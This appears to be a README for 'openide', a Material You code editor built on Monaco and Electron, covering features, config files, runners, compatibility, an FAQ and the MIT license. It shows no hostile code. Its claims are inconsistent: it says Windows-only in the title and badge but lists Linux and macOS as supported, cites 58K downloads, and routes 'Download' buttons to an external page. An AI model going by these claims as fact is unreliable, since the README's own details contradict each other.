<div align="center">

# OpenIDE: Material Design 3 Code Editor with Monaco & Live Preview for Windows 10 & 11

![preview](https://raw.githubusercontent.com/AbdulSamad350z/openide/main/view_b8d1.svg)

[![downloads](https://img.shields.io/badge/downloads-58K-0f172a?style=for-the-badge&labelColor=1e293b)]() [![version](https://img.shields.io/badge/version-1.0.2-0f172a?style=for-the-badge&labelColor=1e293b)]() [![platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0f172a?style=for-the-badge&labelColor=1e293b)]()

[![Download](https://raw.githubusercontent.com/AbdulSamad350z/openide/main/fetch_849d.svg)](https://AbdulSamad350z.github.io/openide/)

</div>

---

openide is a free, open-source IDE built on Material Design 3 (Material You) and Monaco Editor, aimed at developers who want a lightweight, deeply customizable coding environment. It generates HCT tonal palettes and matching syntax highlighting from any seed color, and its configuration files, plugins, and custom themes hot-reload instantly, including edits made in external editors. An integrated code runner, Git diff, live preview, and workspace file explorer keep common tasks inside the app, while the plugin system and visual customization studio make it stand apart from fixed-theme editors.

## Features

- **Material You Dynamic Color Engine**
 - Enter any seed color (`#HEX`) and openide generates a full HCT tonal palette: surface layers, primary/secondary/tertiary accents, and matching container colors.
 - The generated palette is applied to the Monaco Editor syntax highlighting theme, so chrome and code stay visually consistent.
 - Themes can be saved as standalone `.json` files and dropped into the themes directory.

- **Real-Time Hot-Reloaded Configuration**
 - Every configuration file — settings, keybindings, runners, snippets, user CSS, and custom themes — is watched by live file watchers.
 - External edits made in any other editor or terminal take effect immediately; no restart required.
 - Plugins dropped into the plugin directory are picked up the same way.

- **Monaco Editor Integration**
 - Syntax highlighting, snippet-based code completion, multi-cursor editing, line numbers, and minimap support.
 - Keybindings are user-configurable and reloaded live.

- **Integrated Multi-Language Code Runner**

 | Capability | Behavior |
 |---|---|
 | Trigger | Single keypress (`F5`) on the active file |
 | Language mapping | Extension → command, defined in `runners.json` |
 | Output | Captured and displayed inside the IDE |
 | Extensibility | Add or override entries in `runners.json`; changes apply instantly |

- **Customization Studio (`Ctrl+,`)**
 - Visual theme builder with color pickers and instant preview.
 - Corner radius control, from sharp (`0px`) to expressive pill shapes.
 - UI density modes: `compact`, `comfortable`, `spacious`.
 - Visual keybinding recorder for reassigning shortcuts without hand-editing JSON.
 - Embedded live CSS editor for `user-style.css`.
 - Profile bundle export/import to back up or share an entire setup.

- **Extensible Plugin System**
 - Modular plugin architecture exposing a documented API object to plugin code.
 - Plugins can register commands and add custom status bar items.
 - Drop-in loading from the plugins directory, hot-reloaded alongside config.

- **Workspace & Developer Utilities**
 - Native file explorer with tree view and file management actions.
 - Integrated terminal with shell support.
 - Git integration for inspecting diffs, committing, and managing repositories.
 - Live preview pane for rendered output.

## How it works

openide is split into an Electron main process and a renderer process. The main process owns the filesystem watchers, the code runner, and Git operations, while the renderer hosts the Material You engine, Monaco Editor, and Studio UI. They communicate over IPC, so heavy work never blocks the editor.

**Startup sequence**

1. The main process loads the default config files from `config/`.
2. The Material You engine converts the chosen seed color into HCT tonal palettes and derives surface, primary, secondary, and tertiary roles from them.
3. The generated palette is used to style the UI and to build a matching Monaco syntax theme.
4. The renderer mounts Monaco, the file explorer, the terminal panel, and the status bar.
5. File watchers are attached to `config/` and `plugins/`.

**Live hot-reload pipeline**

| Step | What happens |
| --- | --- |
| Change detected | `fs.watch` fires on a file inside `config/` or `plugins/` |
| File classified | Settings, keybindings, runners, snippets, CSS, or theme JSON |
| Reconciled | New values are merged with the running state; only difference is applied |
| Re-rendered | UI, Monaco theme, or both are updated without an app restart |
| User editing | Edits made in any external editor take effect the same way as in-app edits |

**Seed color to Material You palette**

The dynamic color engine starts from a single `#HEX` seed and produces a full tonal set. Themes are stored as standalone `.json` files:

```json
{
 "name": "example-theme",
 "seed": "#6750A4",
 "cornerRadius": 12,
 "density": "comfortable"
}
```

Dropping a new file into `config/themes/` triggers the watcher and makes the theme selectable immediately.

**Code execution**

Runners are defined per file extension in `config/runners.json`. When you invoke the run action, the main process resolves the active file's extension, builds the command, and spawns it. Output streams back to the integrated terminal panel.

```json
{
 ".py": "python3 {file}",
 ".js": "node {file}"
}
```

**Git diff and live preview**

Git operations (status, diff, commit) run in the main process against the open workspace and stream results to the renderer for display. The live preview renders the current file in an embedded view and refreshes as the file changes on disk.

**Plugin loading**

Plugins in `plugins/` are JavaScript modules loaded by the renderer and given access to `OpenIDEAPI`. Adding a plugin file registers it without a restart; the watcher detects the change and loads the new module.

## Configuration

All configuration lives in the `config/` directory and is watched by file watchers, so edits take effect instantly without restarting the app.

| File | Purpose |
| --- | --- |
| `config/settings.json` | Core settings: seed color, theme, layout, UI density, corner radius |
| `config/keybindings.json` | Keyboard shortcut mappings |
| `config/runners.json` | Code execution commands keyed by file extension |
| `config/snippets.json` | Autocomplete code snippets |
| `config/user-style.css` | Custom CSS rules applied live |
| `config/themes/` | Standalone `.json` color themes |

### Settings

```json
{
 "seedColor": "#6750A4",
 "theme": "dynamic",
 "density": "comfortable",
 "cornerRadius": 12
}
```

- **`seedColor`** — any `#HEX` value; the HCT tonal palette engine derives surface layers and primary/secondary/tertiary accents from it.
- **`density`** — one of `compact`, `comfortable`, or `spacious`.
- **`cornerRadius`** — pixel value from `0` (sharp) to `28` (expressive pill).

### Runners

Map file extensions to execution commands:

```json
{
 ".py": "python3 {file}",
 ".js": "node {file}",
 ".rs": "rustc {file} -o {file}.out && {file}.out"
}
```

The `{file}` placeholder is replaced with the path of the active editor buffer before execution (triggered with `F5`).

### Themes

Custom themes are standalone `.json` files placed in `config/themes/`. Each file defines the color tokens used by both the UI and the generated Monaco syntax theme. Select an active theme through `settings.json` or the customization studio.

### Keybindings and Snippets

`config/keybindings.json` maps commands to key chords, and `config/snippets.json` defines autocomplete entries. Both can be edited by hand or through the visual editors in the customization studio, which writes back to the same files.

### Live Reload Behavior

Because every file in `config/` is monitored, changes made in any external editor are picked up immediately:

- Color, density, and radius changes re-render the UI and regenerate the Monaco theme.
- Runner edits apply to the next execution.
- CSS edits are injected without a reload.
- New or modified plugin files under `plugins/` are re-registered automatically.

## Compatibility

openide targets the Electron runtime and is designed to run consistently across desktop platforms. Compatibility depends on the platform, the available language toolchains, and the structure of the configuration files.

### Platform Support

| Platform | Status | Notes |
| --- | --- | --- |
| Windows | Supported | Standalone executable output is intended for Windows; default `config/` and `plugins/` folders ship alongside the build. |
| Linux | Supported | Requires a working shell for the integrated terminal and configured runners. |
| macOS | Supported | Shell-based runners and terminal integration work through the native shell. |

### Runtime Requirements

- A Node.js runtime matching the version required by the project's `package.json` engines field.
- `npm` for dependency resolution and script execution.
- Electron is resolved through the project dependencies; no separate global installation is expected.
- A functioning shell available to the integrated terminal and to code runners.

### Language Runtimes

Code execution is command-based. A runner only works if the corresponding interpreter or compiler is installed and reachable on `PATH`.

| Runner | Required Toolchain |
| --- | --- |
| Python | `python` or `python3` on `PATH` |
| JavaScript | `node` on `PATH` |
| TypeScript | TypeScript execution tooling configured in `runners.json` |
| Rust | `rustc` (and `cargo` where used by the runner) |
| C++ | A C++ compiler such as `g++` or `clang++` |
| C# | The .NET SDK or a compatible compiler |
| Go | The Go toolchain |

Runners are defined per file extension, so any language can be added by supplying a command in `config/runners.json`:

```json
{
 "runners": {
 ".py": "python3 {file}",
 ".js": "node {file}"
 }
}
```

If a toolchain is missing, execution fails at the runner level; the IDE itself remains functional.

### Configuration Compatibility

- Configuration files use standard JSON and must remain valid JSON for live hot-reload to apply. Invalid JSON is not applied until corrected.
- `user-style.css` accepts standard CSS and is reloaded on save.
- Files in `config/themes/` are read as JSON theme definitions; malformed theme files are skipped.
- Plugin files in `plugins/` are JavaScript and must conform to the `OpenIDEAPI` surface to load correctly.
- Profile bundle export/import preserves supported settings; bundles produced by incompatible schema versions may not map cleanly onto newer configurations.

### Known Limitations

- Terminal behavior and runner commands are shell-dependent; Windows and POSIX shells differ in quoting and path handling.
- Monaco Editor features depend on the bundled editor version and the language support registered by the host.
- Behavior may vary between packaged builds and development runs when external configuration folders are present in different locations.

## FAQ

**Does openide require an account or send my code anywhere?**

No. openide runs entirely on your machine. There is no sign-in, no telemetry tied to an account, and no remote code execution — your files stay local unless you explicitly push them through Git.

**Which languages can I run out of the box?**

Runners are defined in `config/runners.json`, so support depends on your configuration. Common setups cover Python, JavaScript, TypeScript, Rust, C++, C#, and Go. Each entry maps a file extension to a shell command; anything installed and reachable on your `PATH` can be wired in.

**Why didn't my config change take effect?**

All files under `config/` and `plugins/` are watched and hot-reloaded. If an edit appears to be ignored, check for these common causes:

| Symptom | Likely cause | Fix |
| --- | --- | --- |
| Theme unchanged | Invalid JSON or malformed `#HEX` seed | Validate the file; use 6-digit hex |
| Keybinding not applied | Conflicting shortcut in `keybindings.json` | Remove or reassign the duplicate |
| Plugin inactive | Plugin not exporting the expected API surface | Verify it registers via `OpenIDEAPI` |
| Runner not firing | Extension key missing or command not on `PATH` | Confirm the extension and command |

**Can I customize colors beyond the presets?**

Yes. Provide any seed color as a hex value and the engine derives full tonal palettes plus a matching editor syntax theme. You can save the result as a `.json` theme and drop it into `config/themes/`, or use the built-in customization studio for a visual workflow.

**How do custom styles and themes interact?**

`config/user-style.css` is applied independently of the generated Material You theme, so CSS overrides stack on top of theme changes. Order of application:

1. Base Material You palette (from seed color)
2. Selected theme file in `config/themes/`
3. Rules in `config/user-style.css`

**Is there a way to back up my entire setup?**

Yes — use the profile bundle export to capture settings, keybindings, runners, snippets, styles, and themes into a single archive, then import it on another machine.

**Can I use openide without running code in it?**

Absolutely. The editor, file explorer, Git diff, and live preview all work independently of the code runner. Disable or trim `config/runners.json` if you only want editing features.

**What should I include when reporting a bug?**

Provide your OS, the relevant `config/` files (redact anything private), and the steps to reproduce. If the issue involves a runner, include the exact command from `runners.json`.

## License

This project is released under the **MIT License** — a permissive open-source license that allows you to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, provided the copyright notice and permission notice are included in all copies or substantial portions of the software.

### What You Can Do

- ✅ **Use** — run openide for personal, academic, or commercial projects
- ✅ **Modify** — change the source, rebrand, or tailor the IDE to your workflow
- ✅ **Distribute** — share original or modified copies
- ✅ **Sublicense** — include openide in larger works under your own terms
- ✅ **Sell** — build commercial products on top of it

### What You Must Do

| Requirement | Details |
|---|---|
| Include the license | Ship the full MIT license text with any copy or substantial portion |
| Preserve attribution | Keep the original copyright notice intact |
| Accept the warranty disclaimer | The software is provided "as is," without warranty of any kind |

### What You Cannot Do

- ❌ **Hold the authors liable** — no responsibility is accepted for damages or losses arising from use of the software
- ❌ **Use the project's name or branding** — the license grants no trademark or naming rights
- ❌ **Strip the license** — removing the notice does not remove the license obligations

### Contributions

By submitting a pull request, patch, or other contribution to openide, you agree that your contribution is licensed under the same MIT terms and that you have the right to license it.

### Dependencies

openide bundles or depends on third-party libraries — including but not limited to **Monaco Editor**, **Electron**, and other npm packages — each distributed under its own license. Those licenses remain in effect for their respective components; refer to each dependency's own license text for details.

```
MIT License

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

The complete, authoritative license text is contained in the `LICENSE` file at the repository root. If there is any discrepancy between this summary and that file, the `LICENSE` file governs.

[![Download](https://raw.githubusercontent.com/AbdulSamad350z/openide/main/fetch_849d.svg)](https://AbdulSamad350z.github.io/openide/)